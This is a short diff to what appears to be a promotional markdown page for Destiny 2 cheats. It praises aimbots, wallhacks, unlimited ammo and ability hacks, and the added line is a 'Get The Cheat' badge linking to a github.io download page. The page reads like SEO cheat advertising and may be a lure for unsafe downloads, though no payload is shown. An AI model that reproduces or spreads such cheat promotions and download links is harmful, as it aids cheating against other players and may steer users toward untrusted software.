@@ -4,6 +4,7 @@
 
 **Destiny 2** is one of the most popular looter-shooters ever, mixing PvE raids with PvP Crucible matches. While many grind gear and skill for months, some players shortcut the process with **Destiny 2 cheats**. From aimbots and wallhacks to unlimited ammo and ability hacks, these tools give massive advantages in both solo and competitive play. In this guide, we’ll break down the most common cheats, their features, and how they compare to hacks in other shooters.
 
+[![Get](https://img.shields.io/badge/Get%20The-Cheat-blueviolet)](https://destiny-2-cheat-hacks.github.io/.github/)
 ---
 
 ## What Are Destiny 2 Cheats?
